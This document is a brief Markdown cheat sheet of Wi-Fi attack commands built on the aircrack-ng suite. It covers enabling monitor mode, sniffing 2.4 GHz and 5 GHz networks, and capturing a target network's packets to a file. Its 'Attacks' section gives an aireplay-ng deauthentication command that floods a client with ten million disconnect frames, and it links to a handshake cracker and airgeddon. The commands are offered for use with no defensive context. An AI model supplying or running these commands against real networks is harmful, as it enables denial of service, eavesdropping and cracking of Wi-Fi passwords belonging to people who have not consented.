# WI-FI, wifi

## Enable monitor wifi mode

- `sudo ip link set wlp0s20f0u3 down`

- `sudo airmon-ng check kill`

- `sudo iw dev wlp0s20f0u3 set type monitor`
- `sudo ip link set wlp0s20f0u3 up`

### switch channel

- `sudo airmon-ng start wlp0s20f0u3 3`

## Packet sniffing

- `sudo airodump-ng wlp0s20f0u3` - sniff 2.4Ghz networks
- `sudo airodump-ng --band a wlp0s20f0u3` - sniff 5Ghz networks
- `sudo airodump-ng --band abg wlp0s20f0u3` - sniff both 2.4Ghz and 5Ghz networks

- `sudo airodump-ng --bssid EE:EE:EE:BB:BB:BB --channel 2 --write sniffed-packets wlanmon0` - save packets to a file

## Attacks

Disconnect a device from the network:

- `sudo aireplay-ng --deauth 10000000 -a EE:EE:EE:BB:BB:BB -c CC:CC:CC:AA:AA:AA wlanmon0`

- [handshake cracker](https://github.com/semeion/handshake-cracker)

## more tools

- [kismet](https://github.com/kismetwireless/kismet)
- [airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon)
